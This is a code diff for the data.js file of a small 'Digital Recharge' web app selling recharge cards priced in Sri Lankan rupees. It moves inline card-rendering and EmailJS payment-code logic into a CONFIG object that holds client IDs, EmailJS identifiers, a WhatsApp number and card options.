@@ -1,35 +1,27 @@
-const cards = [{ name: "500 LKR" }, { name: "1000 LKR" }, { name: "2000 LKR" }];
+// ==============================
+// Digital Recharge - data.js
+// Configuration & constants
+// ==============================
 
-function renderCards() {
-    const list = document.getElementById('card-list');
-    cards.forEach((card) => {
-        const btn = document.createElement('button');
-        btn.className = "card-btn";
-        btn.innerText = card.name;
-        btn.onclick = () => showGenerate(card.name);
-        list.appendChild(btn);
-    });
-}
+const CONFIG = {
+  GOOGLE_CLIENT_ID: "12019111383-058lqu79k9jvbdcq7brqql1ukt1028l8.apps.googleusercontent.com",
 
-function showGenerate(name) {
-    document.getElementById('dash-view').innerHTML = `
-        <h3>${name} Selected</h3>
-        <button class="card-btn" style="width:100%" onclick="finalStep('${name}')">Generate Code</button>
-        <button class="card-btn" style="width:100%; margin-top:10px; background:transparent" onclick="location.reload()">Back</button>
-    `;
-}
+  EMAILJS_PUBLIC_KEY: "HahSYzYSEJF5oRsnt",
+  EMAILJS_SERVICE_ID: "service_ky2ympa",
+  EMAILJS_TEMPLATE_ID: "template_5sac14q",
 
-function finalStep(name) {
-    const code = prompt("Enter 6-digit payment code:");
-    if (!code || code.length !== 6) return alert("Invalid code!");
-    
-    // EmailJS එක හරියටම දාන්න
-    emailjs.send("service_ky2ympa", "template_5sac14q", {
-        name: "User",
-        card_name: name,
-        payment_code: code
-    }, "HahSYzYSEJF5oRsnt").then(() => {
-        alert("Success! Request sent.");
-        location.reload();
-    });
-}
+  WHATSAPP_NUMBER: "0772915479",
+
+  // Recharge card options shown on the dashboard
+  CARDS: [
+    { id: "card_500", label: "500 LKR", amount: 500 },
+    { id: "card_1000", label: "1000 LKR", amount: 1000 },
+    { id: "card_2000", label: "2000 LKR", amount: 2000 }
+  ],
+
+  // localStorage keys
+  STORAGE_KEYS: {
+    TOKEN: "dr_auth_token",
+    USER: "dr_user_info"
+  }
+};
